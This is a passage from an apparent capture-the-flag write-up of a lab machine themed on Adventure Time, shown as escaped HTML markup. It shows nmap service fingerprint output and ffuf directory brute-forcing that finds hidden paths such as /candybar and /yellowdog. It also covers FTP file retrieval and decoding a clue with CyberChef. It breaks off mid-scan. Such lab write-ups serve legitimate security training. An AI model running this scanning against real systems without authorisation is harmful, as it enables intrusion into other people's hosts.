&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">SF:at\x20is\x20the\x20magic\x20word\?\n&amp;#34;&lt;/span>&lt;span class="o">)&lt;/span>%r&lt;span class="o">(&lt;/span>HTTPOptions,5B,&lt;span class="s2">&amp;#34;Hello\x20Princ
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">SF:ess\x20Bubblegum\.\x20What\x20is\x20the\x20magic\x20word\?\nThe\x20magi
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">SF:c\x20word\x20is\x20not\x20OPTIONS\x20/\x20HTTP/1\.0\n&amp;#34;&lt;/span>&lt;span class="o">)&lt;/span>%r&lt;span class="o">(&lt;/span>RTSPRequest,5
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">SF:B,&lt;span class="s2">&amp;#34;Hello\x20Princess\x20Bubblegum\.\x20What\x20is\x20the\x20magic\x20wo
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">SF:rd\?\nThe\x20magic\x20word\x20is\x20not\x20OPTIONS\x20/\x20RTSP/1\.0\n&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">SF:&lt;span class="o">)&lt;/span>%r&lt;span class="o">(&lt;/span>RPCCheck,75,&lt;span class="s2">&amp;#34;Hello\x20Princess\x20Bubblegum\.\x20What\x20is\x20the\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">SF:x20magic\x20word\?\nThe\x20magic\x20word\x20is\x20not\x20\x80\0\0\(r\xf
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">SF:e\x1d\x13\0\0\0\0\0\0\0\x02\0\x01\x86\xa0\0\x01\x97\|\0\0\0\0\0\0\0\0\0
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">SF:\0\0\0\0\0\0\0\0\0\0\0\n&amp;#34;&lt;/span>&lt;span class="o">)&lt;/span>%r&lt;span class="o">(&lt;/span>DNSVersionBindReqTCP,69,&lt;span class="s2">&amp;#34;Hello\x20Princess
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">SF:\x20Bubblegum\.\x20What\x20is\x20the\x20magic\x20word\?\nThe\x20magic\x
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">SF:20word\x20is\x20not\x20\0\x1e\0\x06\x01\0\0\x01\0\0\0\0\0\0\x07version\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">SF:x04bind\0\0\x10\0\x03\n&amp;#34;&lt;/span>&lt;span class="o">)&lt;/span>%r&lt;span class="o">(&lt;/span>DNSStatusRequestTCP,57,&lt;span class="s2">&amp;#34;Hello\x20Princess\x
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">SF:20Bubblegum\.\x20What\x20is\x20the\x20magic\x20word\?\nThe\x20magic\x20
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">SF:word\x20is\x20not\x20\0\x0c\0\0\x10\0\0\0\0\0\0\0\0\0\n&amp;#34;&lt;/span>&lt;span class="o">)&lt;/span>%r&lt;span class="o">(&lt;/span>Help,4D,&lt;span class="s2">&amp;#34;He
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">SF:llo\x20Princess\x20Bubblegum\.\x20What\x20is\x20the\x20magic\x20word\?\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">SF:nThe\x20magic\x20word\x20is\x20not\x20HELP\n&amp;#34;&lt;/span>&lt;span class="o">)&lt;/span>%r&lt;span class="o">(&lt;/span>SSLSessionReq,A1,&lt;span class="s2">&amp;#34;Hell
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">SF:o\x20Princess\x20Bubblegum\.\x20What\x20is\x20the\x20magic\x20word\?\nT
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">SF:he\x20magic\x20word\x20is\x20not\x20\x16\x03\0\0S\x01\0\0O\x03\0\?G\xd7
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">SF:\xf7\xba,\xee\xea\xb2`~\xf3\0\xfd\x82{\xb9\xd5\x96\xc8w\x9b\xe6\xc4\xdb
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">SF:&amp;lt;=\xdbo\xef\x10n\0\0\(\0\x16\0\x13\0\n\0f\0\x05\0\x04\0e\0d\0c\0b\0a\0`
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">SF:\0\x15\0\x12\0\t\0\x14\0\x11\0\x08\0\x06\0\x03\x01\0\n&amp;#34;&lt;/span>&lt;span class="o">)&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Service Info: Host: 127.0.1.1&lt;span class="p">;&lt;/span> OSs: Unix, Linux&lt;span class="p">;&lt;/span> CPE: cpe:/o:linux:linux_kernel
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Nmap &lt;span class="k">done&lt;/span>: &lt;span class="m">1&lt;/span> IP address &lt;span class="o">(&lt;/span>&lt;span class="m">1&lt;/span> host up&lt;span class="o">)&lt;/span> scanned in 162.12 seconds
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>We see that we have a ftp server with some images in it.&lt;/p>
&lt;p>I downloaded them and tried to upload a file, but it didn’t work out, so I am going to explore the web page.&lt;/p>
&lt;p>In the http page there is nothing of interest, but in the https page there is a subdirectory that we can look for:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;span class="lnt">33
&lt;/span>&lt;span class="lnt">34
&lt;/span>&lt;span class="lnt">35
&lt;/span>&lt;span class="lnt">36
&lt;/span>&lt;span class="lnt">37
&lt;/span>&lt;span class="lnt">38
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">ffuf -u https://10.10.237.150:443/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> /&lt;span class="s1">&amp;#39;___\ /&amp;#39;&lt;/span>___&lt;span class="se">\ &lt;/span> /&lt;span class="err">&amp;#39;&lt;/span>___&lt;span class="se">\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> /&lt;span class="se">\ \_&lt;/span>_/ /&lt;span class="se">\ \_&lt;/span>_/ __ __ /&lt;span class="se">\ \_&lt;/span>_/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="se">\ \ &lt;/span>,__&lt;span class="se">\\&lt;/span> &lt;span class="se">\ &lt;/span>,__&lt;span class="se">\/\ \/\ \ \ \ &lt;/span>,__&lt;span class="se">\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> &lt;span class="se">\ \ \_&lt;/span>/ &lt;span class="se">\ \ \_&lt;/span>/&lt;span class="se">\ \ \_\ \ \ \ \_&lt;/span>/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="se">\ \_\ &lt;/span> &lt;span class="se">\ \_\ &lt;/span> &lt;span class="se">\ \_&lt;/span>___/ &lt;span class="se">\ \_\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> &lt;span class="se">\/&lt;/span>_/ &lt;span class="se">\/&lt;/span>_/ &lt;span class="se">\/&lt;/span>___/ &lt;span class="se">\/&lt;/span>_/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> v2.1.0-dev
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">________________________________________________
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Method : GET
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: URL : https://10.10.237.150:443/FUZZ
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Wordlist : FUZZ: /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Follow redirects : &lt;span class="nb">false&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Calibration : &lt;span class="nb">false&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Timeout : &lt;span class="m">10&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Threads : &lt;span class="m">40&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Matcher : Response status: 200-299,301,302,307,401,403,405,500
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">________________________________________________
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">[&lt;/span>Status: 200, Size: 216, Words: 30, Lines: 12, Duration: 61ms&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Priority ordered case insensative list, where entries were found [Status: 200, Size: 216, Words: 30, Lines: 12, Duration: 65ms]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># [Status: 200, Size: 216, Words: 30, Lines: 12, Duration: 61ms]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># or send a letter to Creative Commons, 171 Second Street, [Status: 200, Size: 216, Words: 30, Lines: 12, Duration: 63ms]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># [Status: 200, Size: 216, Words: 30, Lines: 12, Duration: 66ms]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Attribution-Share Alike 3.0 License. To view a copy of this [Status: 200, Size: 216, Words: 30, Lines: 12, Duration: 64ms]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># This work is licensed under the Creative Commons [Status: 200, Size: 216, Words: 30, Lines: 12, Duration: 60ms]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># license, visit http://creativecommons.org/licenses/by-sa/3.0/ [Status: 200, Size: 216, Words: 30, Lines: 12, Duration: 59ms]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># on atleast 2 different hosts [Status: 200, Size: 216, Words: 30, Lines: 12, Duration: 59ms]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 216, Words: 30, Lines: 12, Duration: 61ms]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Copyright 2007 James Fisher [Status: 200, Size: 216, Words: 30, Lines: 12, Duration: 61ms]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># directory-list-lowercase-2.3-medium.txt [Status: 200, Size: 216, Words: 30, Lines: 12, Duration: 61ms]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># [Status: 200, Size: 216, Words: 30, Lines: 12, Duration: 62ms]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># [Status: 200, Size: 216, Words: 30, Lines: 12, Duration: 331ms]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">[&lt;/span>Status: 200, Size: 216, Words: 30, Lines: 12, Duration: 61ms&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">candybar &lt;span class="o">[&lt;/span>Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 66ms&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>And we got a message:&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/Blueaulo/AdventureTime-writeup-THM/main/2156d084-f7ce-479d-b8c4-098ec653c1ed_Export-8951dd85-c9ac-4f1a-82d6-6f0da607c4ac/Adventure%20Time%2044bd355551e24dd4bbf6c95c363d0634/Untitled.png"
loading="lazy"
alt="Untitled"
>&lt;/p>
&lt;p>We can decypher with cyberchef:&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/Blueaulo/AdventureTime-writeup-THM/main/2156d084-f7ce-479d-b8c4-098ec653c1ed_Export-8951dd85-c9ac-4f1a-82d6-6f0da607c4ac/Adventure%20Time%2044bd355551e24dd4bbf6c95c363d0634/Untitled%201.png"
loading="lazy"
alt="Untitled"
>&lt;/p>
&lt;p>From there we can find this email address: &lt;a class="link" href="mailto:bubblegum@land-of-ooo.com" >bubblegum@land-of-ooo.com&lt;/a>, which we should put in the hosts file.&lt;/p>
&lt;p>Now that we found jake we should re-enumerate the website:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;span class="lnt">33
&lt;/span>&lt;span class="lnt">34
&lt;/span>&lt;span class="lnt">35
&lt;/span>&lt;span class="lnt">36
&lt;/span>&lt;span class="lnt">37
&lt;/span>&lt;span class="lnt">38
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">ffuf -u https://land-of-ooo.com/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> /&lt;span class="s1">&amp;#39;___\ /&amp;#39;&lt;/span>___&lt;span class="se">\ &lt;/span> /&lt;span class="err">&amp;#39;&lt;/span>___&lt;span class="se">\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> /&lt;span class="se">\ \_&lt;/span>_/ /&lt;span class="se">\ \_&lt;/span>_/ __ __ /&lt;span class="se">\ \_&lt;/span>_/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="se">\ \ &lt;/span>,__&lt;span class="se">\\&lt;/span> &lt;span class="se">\ &lt;/span>,__&lt;span class="se">\/\ \/\ \ \ \ &lt;/span>,__&lt;span class="se">\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> &lt;span class="se">\ \ \_&lt;/span>/ &lt;span class="se">\ \ \_&lt;/span>/&lt;span class="se">\ \ \_\ \ \ \ \_&lt;/span>/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="se">\ \_\ &lt;/span> &lt;span class="se">\ \_\ &lt;/span> &lt;span class="se">\ \_&lt;/span>___/ &lt;span class="se">\ \_\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> &lt;span class="se">\/&lt;/span>_/ &lt;span class="se">\/&lt;/span>_/ &lt;span class="se">\/&lt;/span>___/ &lt;span class="se">\/&lt;/span>_/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> v2.1.0-dev
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">________________________________________________
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Method : GET
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: URL : https://land-of-ooo.com/FUZZ
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Wordlist : FUZZ: /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Follow redirects : &lt;span class="nb">false&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Calibration : &lt;span class="nb">false&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Timeout : &lt;span class="m">10&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Threads : &lt;span class="m">40&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Matcher : Response status: 200-299,301,302,307,401,403,405,500
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">________________________________________________
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">[&lt;/span>Status: 200, Size: 212, Words: 29, Lines: 12, Duration: 57ms&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Copyright 2007 James Fisher [Status: 200, Size: 212, Words: 29, Lines: 12, Duration: 55ms]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># directory-list-lowercase-2.3-medium.txt [Status: 200, Size: 212, Words: 29, Lines: 12, Duration: 56ms]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># This work is licensed under the Creative Commons [Status: 200, Size: 212, Words: 29, Lines: 12, Duration: 55ms]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># or send a letter to Creative Commons, 171 Second Street, [Status: 200, Size: 212, Words: 29, Lines: 12, Duration: 55ms]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># [Status: 200, Size: 212, Words: 29, Lines: 12, Duration: 54ms]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># [Status: 200, Size: 212, Words: 29, Lines: 12, Duration: 54ms]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># license, visit http://creativecommons.org/licenses/by-sa/3.0/ [Status: 200, Size: 212, Words: 29, Lines: 12, Duration: 56ms]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 212, Words: 29, Lines: 12, Duration: 57ms]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># [Status: 200, Size: 212, Words: 29, Lines: 12, Duration: 57ms]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># on atleast 2 different hosts [Status: 200, Size: 212, Words: 29, Lines: 12, Duration: 59ms]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Priority ordered case insensative list, where entries were found [Status: 200, Size: 212, Words: 29, Lines: 12, Duration: 61ms]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Attribution-Share Alike 3.0 License. To view a copy of this [Status: 200, Size: 212, Words: 29, Lines: 12, Duration: 328ms]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># [Status: 200, Size: 212, Words: 29, Lines: 12, Duration: 347ms]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">yellowdog &lt;span class="o">[&lt;/span>Status: 301, Size: 322, Words: 20, Lines: 10, Duration: 61ms&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">[&lt;/span>Status: 200, Size: 212, Words: 29, Lines: 12, Duration: 58ms&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>We found another subdirectory&lt;/p>
&lt;p>Another time:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;span class="lnt">33
&lt;/span>&lt;span class="lnt">34
&lt;/span>&lt;span class="lnt">35
&lt;/span>&lt;span class="lnt">36
&lt;/span>&lt;span class="lnt">37
&lt;/span>&lt;span class="lnt">38
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">ffuf -u https://land-of-ooo.com/yellowdog/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> /&lt;span class="s1">&amp;#39;___\ /&amp;#39;&lt;/span>___&lt;span class="se">\ &lt;/span> /&lt;span class="err">&amp;#39;&lt;/span>___&lt;span class="se">\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> /&lt;span class="se">\ \_&lt;/span>_/ /&lt;span class="se">\ \_&lt;/span>_/ __ __ /&lt;span class="se">\ \_&lt;/span>_/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="se">\ \ &lt;/span>,__&lt;span class="se">\\&lt;/span> &lt;span class="se">\ &lt;/span>,__&lt;span class="se">\/\ \/\ \ \ \ &lt;/span>,__&lt;span class="se">\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> &lt;span class="se">\ \ \_&lt;/span>/ &lt;span class="se">\ \ \_&lt;/span>/&lt;span class="se">\ \ \_\ \ \ \ \_&lt;/span>/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="se">\ \_\ &lt;/span> &lt;span class="se">\ \_\ &lt;/span> &lt;span class="se">\ \_&lt;/span>___/ &lt;span class="se">\ \_\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> &lt;span class="se">\/&lt;/span>_/ &lt;span class="se">\/&lt;/span>_/ &lt;span class="se">\/&lt;/span>___/ &lt;span class="se">\/&lt;/span>_/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> v2.1.0-dev
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">________________________________________________
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Method : GET
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: URL : https://land-of-ooo.com/yellowdog/FUZZ
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Wordlist : FUZZ: /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Follow redirects : &lt;span class="nb">false&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Calibration : &lt;span class="nb">false&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Timeout : &lt;span class="m">10&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Threads : &lt;span class="m">40&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Matcher : Response status: 200-299,301,302,307,401,403,405,500
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">________________________________________________
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># [Status: 200, Size: 227, Words: 32, Lines: 12, Duration: 59ms]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># [Status: 200, Size: 227, Words: 32, Lines: 12, Duration: 61ms]&lt;/span>
